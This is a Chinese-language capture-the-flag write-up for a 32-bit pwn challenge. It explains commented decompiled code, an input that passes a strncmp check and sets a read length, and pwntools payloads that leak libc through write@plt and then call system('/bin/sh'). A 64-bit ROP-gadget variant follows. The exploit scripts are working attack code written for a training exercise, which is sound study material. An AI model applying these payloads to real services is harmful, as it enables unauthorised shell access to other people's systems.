
总结点1：读逆向源程序（详细注释如下）

```C
sub_80486BB();#一些基本的输入输出
fd = open("/dev/urandom", 0);#Linux系统中的一个特殊文件，用于生成随机数。
if ( fd > 0 )#文件打开成功返回非负
    read(fd, &buf, 4u);#读取4字节到buf里面，buf为随机数（没有造成栈溢出）
v2 = sub_804871F(buf);
sub_80487D0(v2);

```
sub_804871F()函数源码如下：
```C
memset(s, 0, sizeof(s))    ;#将指定的内存区域设置为0
memset(buf, 0, sizeof(buf));
sprintf(s, "%ld", a1);
v5 = read(0, buf, 0x20u);   #read函数返回的是读取的字节数（包含最后的'\0'）
buf[v5 - 1] = 0;   #注意不要让这行代码修改了buf[7]
v1 = strlen(buf);
if ( strncmp(buf, s, v1) )#strncmp比较，相同返回0.比较buf和s的前v1个字节，不同直接exit
	exit(0);
write(1, "Correct\n", 8u);
return (unsigned __int8)buf[7];  #返回我们需要的buf[7]（转换为unsigned __int8版），后面溢出会用到

```
进一步的函数如下：
```C
size_t __cdecl sub_80487D0(char nbytes)
{
  _BYTE buf[231]; // [esp+11h] [ebp-E7h] BYREF

  if ( nbytes == 127 )
    return read(0, buf, 0xC8u);
  else
    return read(0, buf, nbytes);
}
```



第一次stdin读发生在`v5 =read(0,buf,0x20u)`处，这里需要控制到`strncmp`处时不要发生exit，即第一个字符输入`\x00`即返回0跳出

同时控制`buf`的第7个值不要等于127，使其能够读取足够大的缓冲区造成栈溢出。
因此第一个payload如下：
```python
payload1 = "\x00" + "\xff"*7
```

剩下的便是进行栈溢出。

总结2：32位程序通过`write`函数泄露libc基址

注意32位程序的函数从栈上直接取址,同时函数返回地址在所有参数前。


我们需要调用`write(1, write_got, 8)`，把 GOT（`write` 的实际地址）泄露到 stdout。**熟悉write函数的传参含义:`write(fd=1, buf=write_got, len=8)`**

对应的payload为
```python
payload2 = b"a"*0xe7 + b'a'*4
payload2 += p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(8)
```

常规ret2libc:
```python
write_addr = u32(r.recv(4))
offset = write_addr - libc.sym['write']
system_addr = offset + libc.sym['system']
bin_bash_addr = offset + next(libc.search('/bin/sh'))
  
r.sendline(payload1)
r.recvuntil('Correct\n')
payload = b'a'*0xe7 + b'a'*4
payload += p32(system_addr) + b'a'*4 + p32(bin_bash_addr)
r.sendline(payload)
r.interactive()
```



### 变式

注意区分64位程序和32位程序在取参数的不同点，对应的泄露地址的exp脚本部分不同，变式：64位
64-bit System V ABI 参数顺序

| 参数   | 作用  | 寄存器 |
| ---- | --- | --- |
| arg1 | fd  | RDI |
| arg2 | buf | RSI |
| arg3 | len | RDX |
调用 write 时必须：
- 先用 `pop rdi; ret` 设置 RDI = 1
- 再用 `pop rsi; ret` 设置 RSI = write_got
- 再用 `pop rdx; ret` 设置 RDX = 8
- 然后跳到 write@plt

即：
```css
pop_rdi_ret
1

pop_rsi_ret
write_got

pop_rdx_ret
8

write_plt
main     ← 返回 main，继续第二阶段

```

假设找到如下 gadget：

`pop_rdi_ret = 0x400a83 pop_rsi_ret = 0x400a81 pop_rdx_ret = 0x4006ec`

然后 payload2 写成（示例）：

```python
payload2  = b"A" * offset       # 64 位的 offset 要重新算，不会是 0xe7

payload2 += p64(pop_rdi_ret)
payload2 += p64(1)

payload2 += p64(pop_rsi_ret)
payload2 += p64(write_got)

payload2 += p64(pop_rdx_ret)
payload2 += p64(8)

payload2 += p64(write_plt)
payload2 += p64(main)           # write 执行完跳回 main

```
